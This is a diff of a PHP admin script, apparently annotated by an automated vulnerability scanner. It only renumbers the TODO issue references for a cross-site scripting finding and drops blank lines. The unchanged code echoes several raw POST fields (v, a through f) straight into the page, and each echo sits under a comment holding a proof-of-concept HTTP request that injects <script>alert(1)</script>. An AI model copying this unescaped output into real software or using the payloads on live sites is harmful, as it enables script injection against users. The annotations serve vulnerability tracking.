@@ -12,7 +12,6 @@ if (empty($_SESSION['mail'])){
 if (isset($_POST))
 {
     //AI exploit:
-
     //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
     //Host: localhost
     //Accept-Encoding: identity
@@ -21,10 +20,9 @@ if (isset($_POST))
     //Content-Length: 41
     //
     //v=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-    //TODO: AI XSS issue #67, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/67, cc6e8a76
+    //TODO: AI XSS issue #68, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/68, afed409c
     echo $_POST['v'];
     //AI exploit:
-
     //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
     //Host: localhost
     //Accept-Encoding: identity
@@ -33,10 +31,9 @@ if (isset($_POST))
     //Content-Length: 41
     //
     //a=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-    //TODO: AI XSS issue #67, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/67, 8777437b
+    //TODO: AI XSS issue #68, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/68, b745ad0e
     echo $_POST['a'];
     //AI exploit:
-
     //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
     //Host: localhost
     //Accept-Encoding: identity
@@ -45,10 +42,9 @@ if (isset($_POST))
     //Content-Length: 41
     //
     //b=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-    //TODO: AI XSS issue #67, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/67, 7610306b
+    //TODO: AI XSS issue #68, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/68, 36ac9098
     echo $_POST['b'];
     //AI exploit:
-
     //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
     //Host: localhost
     //Accept-Encoding: identity
@@ -57,10 +53,9 @@ if (isset($_POST))
     //Content-Length: 41
     //
     //c=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-    //TODO: AI XSS issue #67, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/67, 39134f80
+    //TODO: AI XSS issue #68, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/68, 964d81b8
     echo $_POST['c'];
     //AI exploit:
-
     //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
     //Host: localhost
     //Accept-Encoding: identity
@@ -69,10 +64,9 @@ if (isset($_POST))
     //Content-Length: 41
     //
     //d=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-    //TODO: AI XSS issue #67, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/67, d092e8e7
+    //TODO: AI XSS issue #68, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/68, c802c136
     echo $_POST['d'];
     //AI exploit:
-
     //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
     //Host: localhost
     //Accept-Encoding: identity
@@ -81,10 +75,9 @@ if (isset($_POST))
     //Content-Length: 41
     //
     //e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-    //TODO: AI XSS issue #67, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/67, 0787b5c9
+    //TODO: AI XSS issue #68, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/68, 1ec47e30
     echo $_POST['e'];
     //AI exploit:
-
     //POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
     //Host: localhost
     //Accept-Encoding: identity
@@ -93,7 +86,7 @@ if (isset($_POST))
     //Content-Length: 41
     //
     //f=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-    //TODO: AI XSS issue #67, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/67, 1b948fb3
+    //TODO: AI XSS issue #68, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/68, 4024f19d
     echo $_POST['f'];
 }
 
